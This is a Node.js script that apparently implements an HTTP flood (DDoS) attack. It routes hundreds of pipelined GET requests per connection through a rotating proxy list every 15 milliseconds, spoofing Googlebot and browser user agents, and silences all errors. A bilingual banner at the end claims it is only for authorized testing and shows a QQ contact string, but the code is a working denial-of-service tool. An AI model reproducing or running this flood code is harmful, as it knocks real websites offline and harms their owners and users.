process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target = process.argv[2];
var parsed = url.parse(target);

setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);


const UAs = [
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; BLA-AL00 Build/HUAWEIBLA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.9 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 BIDUBrowser/8.3 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.1.0; PACM00 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36 T7/10.13 baiduboxapp/10.13.0.11 (Baidu; P1 8.1.0)"
];
setInterval(function() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000);
    socket.once('error', err => {
        // console.log('Error : ' + proxy[0] + ":" + proxy[1]);
    });
    socket.once('disconnect', () => {
        console.log('Disconnect');
    });
    socket.once('data', data => {
        // console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
    });
    for (let j = 0; j < 180; j++) {
        socket.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        socket.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 130000);
    })
}, 15);

if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (isNaN(process.argv[4])) {
    console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
    console.log("\x1b[31m Error\x1b[37m: enter valid target");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

console.log("\n" + "=".repeat(70));
console.log("⚠️  重要法律声明 | IMPORTANT LEGAL NOTICE".yellow);
console.log("=".repeat(70));
console.log("本工具仅供合法授权的安全测试使用！".red);
console.log("This tool is ONLY for legally authorized security testing!".red);
console.log("\n未经授权对他人系统进行测试属于违法行为，可能面临刑事起诉！".red);
console.log("Unauthorized testing is ILLEGAL and may result in prosecution!".red);
console.log("\n使用前必须：| Before use, you MUST:".yellow);
console.log("  ✓ 拥有目标系统的书面授权 | Have written authorization".green);
console.log("  ✓ 完整阅读 法律声明.md 文件 | Read 法律声明.md completely".green);
console.log("  ✓ 理解并承担所有法律责任 | Understand and accept all liability".green);
console.log("\n详细说明请阅读项目目录下的【法律声明.md】文件");
console.log("For details, read [LEGAL_NOTICE.md] in project directory");
console.log("=".repeat(70) + "\n");

console.log("Q702405451：脚本提交成功".rainbow);
console.log
("\x1b[36m目标\x1b[37m  %s | " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);
console.log("目标提交成功,本次测压时间为 %s 秒", process.argv[4]);